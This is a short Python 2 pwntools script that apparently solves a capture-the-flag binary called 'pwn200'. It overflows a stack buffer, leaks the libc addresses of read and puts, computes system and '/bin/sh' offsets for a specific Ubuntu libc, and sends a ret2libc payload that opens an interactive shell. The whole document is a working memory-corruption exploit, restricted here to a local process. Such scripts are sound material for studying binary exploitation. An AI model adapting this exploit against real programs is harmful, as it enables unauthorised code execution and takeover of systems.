from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./pwn200')
else :
	print 'Remote server is disabled'
	exit()

# Gadget
pop_1_ret = 0x8048331

# Address
puts_plt = 0x8048360
read_got = 0x804A00C
puts_got = 0x804A010

payload = 'A'*(0x18+4)
payload += p32(puts_plt)
payload += p32(pop_1_ret)
payload += p32(read_got)
payload += p32(puts_plt)
payload += p32(0x8048511)   # func: lOL
payload += p32(puts_got)

p.recvuntil(':D?\n')
p.write(payload)

read_addr = u32(p.recvline()[:4])
puts_addr = u32(p.recvline()[:4])

print '[Exploit] read = '+hex(read_addr)
print '[Exploit] puts = '+hex(puts_addr)

# libc : libc6_2.29-0ubuntu2_i386

libc_base = read_addr-0xED7E0
system_addr = libc_base+0x42C00
str_bin_sh_addr = libc_base+0x184B35

payload = 'A'*(0x18+4)
payload += p32(system_addr)
payload += 'A'*4
payload += p32(str_bin_sh_addr)

p.write(payload)

p.interactive()
